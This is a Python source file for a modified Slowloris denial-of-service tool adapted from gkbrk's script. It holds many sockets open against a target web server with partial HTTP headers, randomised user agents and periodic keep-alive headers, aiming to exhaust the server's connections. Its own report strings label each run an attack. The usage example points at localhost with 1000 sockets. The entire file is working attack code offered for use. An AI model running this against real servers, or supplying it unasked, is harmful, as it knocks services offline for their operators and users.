#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n
# this is a modified version based on the gkbrk original script:
# https://github.com/gkbrk/slowloris


import random, socket, time
from datetime import datetime


# parser = argparse.ArgumentParser(
#     description="Slowloris, low bandwidth stress test tool for websites"
# )
# parser.add_argument("host", nargs="?", help="Host to perform stress test on")
# parser.add_argument(
#     "-p", "--port", default=80, help="Port of webserver, usually 80", type=int
# )
# parser.add_argument(
#     "-s",
#     "--sockets",
#     default=150,
#     help="Number of sockets to use in the test",
#     type=int,
# )
# parser.add_argument(
#     "-v", "--verbose", dest="verbose", action="store_true", help="Increases logging"
# )
# parser.add_argument(
#     "-ua",
#     "--randuseragents",
#     dest="randuseragent",
#     action="store_true",
#     help="Randomizes user-agents with each request",
# )
# parser.add_argument(
#     "-x",
#     "--useproxy",
#     dest="useproxy",
#     action="store_true",
#     help="Use a SOCKS5 proxy for connecting",
# )
# parser.add_argument("--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host")
# parser.add_argument("--proxy-port", default="8080", help="SOCKS5 proxy port", type=int)
# parser.add_argument(
#     "--https", dest="https", action="store_true", help="Use HTTPS for the requests"
# )
# parser.add_argument(
#     "--sleeptime",
#     dest="sleeptime",
#     default=15,
#     type=int,
#     help="Time to sleep between each header sent.",
# )
# parser.set_defaults(verbose=False)
# parser.set_defaults(randuseragent=False)
# parser.set_defaults(useproxy=False)
# parser.set_defaults(https=False)
# args = parser.parse_args()
#
# if len(sys.argv) <= 1:
#     parser.print_help()
#     sys.exit(1)
#
# if not args.host:
#     print("Host required!")
#     parser.print_help()
#     sys.exit(1)

# if args.useproxy:
#     # Tries to import to external "socks" library
#     # and monkey patches socket.socket to connect over
#     # the proxy by default
#     try:
#         import socks
#
#         socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port)
#         socket.socket = socks.socksocket
#         logging.info("Using SOCKS5 proxy for connecting...")
#     except ImportError:
#         logging.error("Socks Proxy Library Not Available!")
#
# if args.verbose:
#     logging.basicConfig(
#         format="[%(asctime)s] %(message)s",
#         datefmt="%d-%m-%Y %H:%M:%S",
#         level=logging.DEBUG,
#     )
# else:
#     logging.basicConfig(
#         format="[%(asctime)s] %(message)s",
#         datefmt="%d-%m-%Y %H:%M:%S",
#         level=logging.INFO,
#     )


class Slowloris:
    def __init__(self, target, to_stop_at=datetime.strftime(datetime.now(), '%Y-%m-%d %H:%M:%S'),
                 port=80, n_sockets=150, enable_https=False, randuseragent=True, sleeptime=15):
        self.target = target
        self.to_stop_at = to_stop_at
        self.port = port
        self.n_sockets = n_sockets
        self.https = enable_https
        self.randuseragent = randuseragent
        self.sleeptime = sleeptime

        self.list_of_sockets = []
        self.user_agents = (
            # CHROME
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPod; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
            #FIREFOX
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.2; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Mozilla/5.0 (X11; Linux i686; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Mozilla/5.0 (Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/31.0 Mobile/15E148 Safari/605.1.15",
            "Mozilla/5.0 (iPad; CPU OS 11_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/31.0 Mobile/15E148 Safari/605.1.15",
            "Mozilla/5.0 (iPod touch; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) FxiOS/31.0 Mobile/15E148 Safari/605.1.15",
            "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/85.0",
            "Mozilla/5.0 (Android 11; Mobile; LG-M255; rv:85.0) Gecko/85.0 Firefox/85.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.2; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Mozilla/5.0 (X11; Linux i686; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Mozilla/5.0 (Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
            # SAFARI
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPod touch; CPU iPhone 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
            # EDGE
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 Edg/88.0.705.63",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 Edg/88.0.705.56",
            "Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36 EdgA/45.12.4.5125",
            "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36 EdgA/45.12.4.5125",
            "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36 EdgA/45.12.4.5125",
            "Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36 EdgA/45.12.4.5125",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 EdgiOS/45.12.4 Mobile/15E148 Safari/605.1.15",
            "Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Mobile Safari/537.36 Edge/40.15254.603",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 Edge/44.19041.4788"
        )

        self.report = 'Initializing report. Number of sockets used: {}\r\nHTTPS enabled: {}\r\nSleep time: {}\r\nAttack started at {}...\r\nRequest sent:\r\n'.format(self.n_sockets, self.https, self.sleeptime, datetime.now().strftime("%Y-%m-%d, %H:%M:%S"))

    def init_socket(self, ip):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        if self.https:
            import ssl
            self.report += "\r\nImporting ssl module"
            s = ssl.wrap_socket(s)

        s.connect((ip, self.port))

        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
        if self.randuseragent:
            s.send("User-Agent: {}\r\n".format(random.choice(self.user_agents)).encode("utf-8"))
        else:
            s.send("User-Agent: {}\r\n".format(self.user_agents[0]).encode("utf-8"))
        s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
        return s


    def run(self):
        ip = self.target
        socket_count = self.n_sockets
        self.report += "\r\nAttacking {} with {} sockets.".format(ip, socket_count)

        for _ in range(socket_count):
            try:
                self.report += "\r\nCreating socket nr {}".format(_)
                s = self.init_socket(ip)
            except socket.error as e:
                self.report += "\r\nERROR: {}".format(e)
                break
            self.list_of_sockets.append(s)

        while True:
            #print(self.report)
            try:
                self.report += "\r\nSending keep-alive headers... Socket count: {}".format(len(self.list_of_sockets))
                for s in list(self.list_of_sockets):
                    try:
                        rand_num = random.randint(1, 5000)
                        s.send(
                            "X-a: {}\r\n".format(rand_num).encode("utf-8")
                        )
                        self.report += '\r\n{}: request with {} bytes sent'.format(datetime.now().strftime("%Y-%m-%d, %H:%M:%S"), rand_num)
                    except socket.error:
                        self.list_of_sockets.remove(s)

                for _ in range(socket_count - len(self.list_of_sockets)):
                    try:
                        s = self.init_socket(ip)
                        if s:
                            self.list_of_sockets.append(s)
                    except socket.error as e:
                        self.report += "\r\nERROR: {}".format(e)
                        break

                # break attack by stop time
                stop_time = datetime.strptime(self.to_stop_at, '%Y-%m-%d %H:%M:%S')
                if datetime.now() >= stop_time:
                    break

                self.report += "\r\nSleeping for %d seconds".format(self.sleeptime)
                time.sleep(self.sleeptime)

            except (KeyboardInterrupt, SystemExit):
                self.report += "\r\nStopping Slowloris"
                break


if __name__ == "__main__":
    # usage example
    slowloris = Slowloris('127.0.0.1', port=80, to_stop_at='2021-07-02 20:58:00', n_sockets=1000)
    slowloris.run()
